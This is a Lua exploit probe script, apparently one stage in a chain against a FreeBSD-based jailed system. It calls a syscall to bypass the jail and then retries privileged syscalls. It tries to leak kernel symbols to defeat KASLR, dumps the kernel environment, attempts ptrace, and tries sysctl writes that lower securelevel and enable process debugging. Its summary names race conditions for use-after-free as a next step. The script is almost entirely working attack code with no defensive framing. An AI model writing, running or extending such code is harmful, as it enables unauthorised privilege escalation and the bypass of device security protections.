-- CRASH_CLASS: MODERATE
-- PROBE 55f: Post-jail-bypass syscall retry
--
-- Prerequisites: 54b showed sys 629 jail bypass succeeded
-- After escaping jail, retry all previously-blocked syscalls
-- that would give us kernel info or further escalation

print("=== PROBE 55f: POST-JAIL ESCALATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local function scan_for_kptrs(buf, size, label)
    local found = 0
    for off = 0, size - 8, 8 do
        local q = safe_rq(buf + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("    +0x%03X: %s  <<< KERNEL PTR", off, hexval(q)))
                found = found + 1
            end
        end
    end
    if found == 0 then print("    (no kernel pointers found)") end
    return found
end

-- ============================================================
-- Step 0: Attempt jail bypass via sys 629
-- ============================================================
print("[*] Step 0: Jail bypass via sys 629")
local sc629 = make_syscall(629)

-- From 54b: the gate is cmpq $1,(%rsi), so arg2 must point to value 1
-- FreeBSD ABI: arg1→rdi, arg2→rsi
local gate_val = memory.alloc(8)
safe_wq(gate_val, uint64(1))

local bypass_ok = false
for _, arg1 in ipairs({0, 1}) do
    local ok, ret = pcall(function()
        return sc629(uint64(arg1), uint64(gate_val), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("  629(%d, &1) = %d%s", arg1, rv, rv == 0 and "  <<< SUCCESS" or ""))
        if rv == 0 then
            bypass_ok = true
            break
        end
    else
        print(string.format("  629(%d, &1) CRASHED", arg1))
    end
end

if not bypass_ok then
    print("")
    print("[!] Jail bypass did not return 0 — continuing anyway to test")
    print("[!] Some syscalls may still work regardless of jail state")
end
print("")

-- ============================================================
-- 1. kldstat (308) — list loaded kernel modules
-- ============================================================
print("[*] 1. kldstat (sys 308)")
local sc308 = make_syscall(308)
local outbuf = memory.alloc(0x400)

for i = 0, 0x3FF, 4 do safe_wd(outbuf + i, 0) end
-- kld_file_stat struct: int version at +0, needs to be set
safe_wd(outbuf, 1)  -- version = 1

local ok, ret = pcall(function()
    -- kldstat(fileid, stat_buf)
    return sc308(uint64(1), uint64(outbuf))
end)
if ok then
    local rv = signed32(ret)
    print("  kldstat(1, buf) = " .. rv)
    if rv == 0 then
        print("  >>> KLDSTAT WORKS POST-JAIL!")
        -- name at +4 (MAXPATHLEN=1024 on FreeBSD, but struct may differ)
        -- address at some offset — scan for kernel ptrs
        scan_for_kptrs(outbuf, 0x400, "kldstat")
        -- Read name string
        local name = ""
        for i = 4, 259 do
            local b = safe_rd(outbuf + i - (i % 4))
            if b then
                local ch = math.floor(b / (2^((i%4)*8))) % 256
                if ch == 0 then break end
                name = name .. string.char(ch)
            end
        end
        if #name > 0 then print("  Module name: " .. name) end
    end
else
    print("  kldstat CRASHED: " .. tostring(ret))
end
print("")

-- ============================================================
-- 2. kldsym (337) — resolve kernel symbols
-- ============================================================
print("[*] 2. kldsym (sys 337)")
local sc337 = make_syscall(337)

-- kldsym(fileid, cmd, data) where cmd=KLDSYM_LOOKUP=1
-- data is struct kld_sym_lookup: version(int), symname(char*), symvalue(uintptr_t), symsize(size_t)
local sym_data = memory.alloc(0x100)
local sym_name = memory.alloc(0x40)

-- Write "printf" as symbol name
local names_to_try = {"printf", "copyin", "copyout", "kernel_map", "allproc", "prison0"}
for _, sname in ipairs(names_to_try) do
    for i = 0, 0x3F, 4 do safe_wd(sym_name + i, 0) end
    -- Write name bytes
    for i = 1, #sname do
        local off = i - 1
        local dw_off = off - (off % 4)
        local existing = safe_rd(sym_name + dw_off) or 0
        local byte_shift = (off % 4) * 8
        local place = 2^byte_shift
        existing = existing - (math.floor(existing / place) % 256) * place + sname:byte(i) * place
        safe_wd(sym_name + dw_off, existing)
    end

    for i = 0, 0xFF, 4 do safe_wd(sym_data + i, 0) end
    safe_wd(sym_data, 1)  -- version = 1
    safe_wq(sym_data + 8, uint64(sym_name))  -- symname ptr
    -- symvalue at +16, symsize at +24

    local ok2, ret2 = pcall(function()
        return sc337(uint64(1), uint64(1), uint64(sym_data))  -- fileid=1, KLDSYM_LOOKUP
    end)
    if ok2 then
        local rv = signed32(ret2)
        local sym_val = safe_rq(sym_data + 16)
        local sym_sz = safe_rq(sym_data + 24)
        print(string.format("  kldsym(\"%s\") = %d  val=%s  sz=%s",
            sname, rv, hexval(sym_val), hexval(sym_sz)))
        if rv == 0 then
            print("  >>> SYMBOL RESOLVED! KASLR DEFEATED!")
        end
    else
        print(string.format("  kldsym(\"%s\") CRASHED", sname))
    end
end
print("")

-- ============================================================
-- 3. kldnext (307) — enumerate all modules
-- ============================================================
print("[*] 3. kldnext (sys 307)")
local sc307 = make_syscall(307)

local fileid = 0
for i = 1, 20 do
    local ok2, ret2 = pcall(function()
        return sc307(uint64(fileid))
    end)
    if ok2 then
        local next_id = to_num(ret2)
        print(string.format("  kldnext(%d) = %d", fileid, next_id))
        if next_id <= 0 then break end
        fileid = next_id
    else
        print(string.format("  kldnext(%d) CRASHED", fileid))
        break
    end
end
print("")

-- ============================================================
-- 4. ptrace (26) — attach to self
-- ============================================================
print("[*] 4. ptrace (sys 26)")
local sc26 = make_syscall(26)
local sc20 = make_syscall(20)

local pid = 0
do local ok2, ret2 = pcall(function() return sc20() end)
    if ok2 then pid = to_num(ret2) end
end

-- PT_ATTACH=10, PT_READ_I=1, PT_READ_D=2
local pt_buf = memory.alloc(0x100)
local ok2, ret2 = pcall(function()
    return sc26(uint64(10), uint64(pid), uint64(0), uint64(0))  -- PT_ATTACH self
end)
print("  ptrace(PT_ATTACH, self) = " .. (ok2 and tostring(signed32(ret2)) or "CRASH"))
print("")

-- ============================================================
-- 5. kenv (390) — kernel environment
-- ============================================================
print("[*] 5. kenv (sys 390)")
local sc390 = make_syscall(390)

-- KENV_DUMP=0, KENV_GET=1
local kenv_buf = memory.alloc(0x1000)
for i = 0, 0xFFF, 4 do safe_wd(kenv_buf + i, 0) end

local ok3, ret3 = pcall(function()
    return sc390(uint64(0), uint64(0), uint64(kenv_buf), uint64(0x1000))  -- KENV_DUMP
end)
if ok3 then
    local rv = signed32(ret3)
    print("  kenv(DUMP) = " .. rv)
    if rv > 0 then
        print("  >>> KENV DUMP WORKS! " .. rv .. " bytes")
        -- Read first few entries (null-separated key=value pairs)
        local str = ""
        local entries = 0
        for off = 0, math.min(rv, 0xFFF) - 1 do
            local dw_off = off - (off % 4)
            local dw = safe_rd(kenv_buf + dw_off) or 0
            local ch = math.floor(dw / (2^((off%4)*8))) % 256
            if ch == 0 then
                if #str > 0 then
                    print("    " .. str)
                    entries = entries + 1
                    if entries >= 10 then
                        print("    ... (truncated)")
                        break
                    end
                end
                str = ""
            else
                str = str .. string.char(ch)
            end
        end
        scan_for_kptrs(kenv_buf, math.min(rv, 0x1000), "kenv")
    end
else
    print("  kenv CRASHED: " .. tostring(ret3))
end
print("")

-- ============================================================
-- 6. modstat (301) — module statistics
-- ============================================================
print("[*] 6. modstat (sys 301)")
local sc301 = make_syscall(301)

local mod_buf = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do safe_wd(mod_buf + i, 0) end
safe_wd(mod_buf, 1)  -- version

local ok4, ret4 = pcall(function()
    return sc301(uint64(1), uint64(mod_buf))  -- modid=1
end)
if ok4 then
    print("  modstat(1) = " .. signed32(ret4))
    if signed32(ret4) == 0 then
        scan_for_kptrs(mod_buf, 0x200, "modstat")
    end
else
    print("  modstat CRASHED: " .. tostring(ret4))
end
print("")

-- ============================================================
-- 7. sysctl writes — securelevel, debug flags
-- ============================================================
print("[*] 7. sysctl writes (post-jail)")
local sc202 = make_syscall(202)

-- Try kern.securelevel write
local mib = memory.alloc(8)
safe_wd(mib, 1)      -- CTL_KERN
safe_wd(mib + 4, 35) -- KERN_SECURELVL

local newval = memory.alloc(4)
safe_wd(newval, 0xFFFFFFFF)  -- -1

local ok5, ret5 = pcall(function()
    return sc202(uint64(mib), uint64(2), uint64(0), uint64(0), uint64(newval), uint64(4))
end)
print("  kern.securelevel=-1: " .. (ok5 and tostring(signed32(ret5)) or "CRASH"))

-- Try security.bsd.unprivileged_proc_debug
safe_wd(mib, 10)     -- CTL_SECURITY (maybe)
safe_wd(mib + 4, 1)
safe_wd(newval, 1)

local ok6, ret6 = pcall(function()
    return sc202(uint64(mib), uint64(2), uint64(0), uint64(0), uint64(newval), uint64(4))
end)
print("  security.bsd.debug=1: " .. (ok6 and tostring(signed32(ret6)) or "CRASH"))
print("")

-- ============================================================
-- 8. fork/rfork — threading after jail escape
-- ============================================================
print("[*] 8. fork/rfork (post-jail)")
local sc2 = make_syscall(2)    -- fork
local sc251 = make_syscall(251) -- rfork

local ok7, ret7 = pcall(function() return sc2() end)
print("  fork() = " .. (ok7 and tostring(signed32(ret7)) or "CRASH"))

local ok8, ret8 = pcall(function()
    return sc251(uint64(0x300))  -- RFPROC|RFMEM — like clone
end)
print("  rfork(RFPROC|RFMEM) = " .. (ok8 and tostring(signed32(ret8)) or "CRASH"))
print("")

-- ============================================================
-- 9. mount — try procfs/devfs
-- ============================================================
print("[*] 9. nmount (sys 378)")
local sc378 = make_syscall(378)

-- Try minimal nmount for devfs
local iov = memory.alloc(0x100)
-- iovec array: {name, namelen, val, vallen} pairs
-- "fstype\0" "devfs\0" "fspath\0" "/dev2\0"
local s1 = memory.alloc(0x20)
local s2 = memory.alloc(0x20)
local s3 = memory.alloc(0x20)
local s4 = memory.alloc(0x20)

-- Write "fstype"
local function put_byte(buf, i, c)
    local off = i - 1
    local word_off = off - off % 4
    local place = 2^((off % 4) * 8)
    local old = safe_rd(buf + word_off) or 0
    safe_wd(buf + word_off, old - (math.floor(old / place) % 256) * place + c * place)
end
for i, c in ipairs({102,115,116,121,112,101,0}) do put_byte(s1, i, c) end
-- "devfs"
for i, c in ipairs({100,101,118,102,115,0}) do put_byte(s2, i, c) end

-- Simplified: just try the call with zeroed args
local ok9, ret9 = pcall(function()
    return sc378(uint64(0), uint64(0), uint64(0))
end)
print("  nmount(0,0,0) = " .. (ok9 and tostring(signed32(ret9)) or "CRASH"))
print("")

-- ============================================================
-- 10. Summary
-- ============================================================
print("[*] Summary of post-jail capabilities:")
print("    Check each syscall result above.")
print("    If kldstat/kldsym worked → KASLR defeated, kernel symbols available")
print("    If fork worked → can do race conditions for UAF")
print("    If kenv worked → may reveal kernel config")
print("    If ptrace worked → can inspect kernel structures")
print("")
print("=== PROBE 55f COMPLETE ===")
